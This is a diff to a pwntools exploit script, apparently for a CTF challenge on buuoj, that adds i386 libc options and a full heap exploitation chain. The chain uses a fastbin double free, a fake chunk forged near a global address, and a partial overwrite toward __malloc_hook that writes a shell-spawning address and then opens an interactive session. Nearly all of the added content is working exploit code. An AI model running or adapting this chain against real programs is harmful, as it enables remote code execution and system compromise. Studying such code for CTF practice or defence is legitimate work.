@@ -31,6 +31,7 @@ parser.add_argument('-r',help='remote host',default='node3.buuoj.cn',metavar='RH
 parser.add_argument('-p',type=int,help='remote port',metavar='RPORT')
 parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC')
 parser.add_argument('-d',help='disable DEBUG mode',action='store_true')
+parser.add_argument('-x86',help='use i386 arch',action='store_true')
 args = parser.parse_args()
 print(args)
 
@@ -41,6 +42,10 @@ if not args.d:
 	context.log_level = 'DEBUG'
 
 path_dict = {
+	'23': '/lib/i386-linux-gnu/libc.so.6',
+	'27': './glibc-all-in-one/libs/2.27-3ubuntu1_i386/libc-2.27.so',
+	'29': './glibc-all-in-one/libs/2.29-0ubuntu2_i386/libc-2.29.so'
+} if args.x86 else {
 	'23': '/lib/x86_64-linux-gnu/libc.so.6',
 	'27': './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',
 	'29': './glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'
@@ -56,11 +61,11 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
+_add,_free,_edit,_show = 1,3,2,4
 def add(index,content='a'*8):
 	sla(':',_add)
 	sla(':',index)
-	sa(':',content)
+	sla(':',content)
 
 def free(index):
 	sla(':',_free)
@@ -69,14 +74,35 @@ def free(index):
 def edit(index,content):
 	sla(':',_edit)
 	sla(':',index)
-	sa(':',content)
+	sla(':',content)
 
 def show(index):
 	sla(':',_show)
 	sla(':',index)
 
 # start
+add(0)
+add(1)
+free(0)
+free(1)
+free(0)
+fake = 0x602060
+fake_next = 0x602150
+add(2,p64(fake-0x23))
+add(3)
+add(4)
 
+payload = flat('a'*3,0,0x101,fake,0,fake,0,fake_next,0,0)
+add(5, payload)
+edit(4,flat(0,0x21,0,0,0,0x21))
+
+free(0) # 0x100
+edit(2,'') # \x00, malloc_hook-0x10
+system = 0x4008e3
+edit(0,'a'*0x10+p64(system))
+
+sla(':',_add)
+sla(':',3)
 # end
 
 p.interactive()
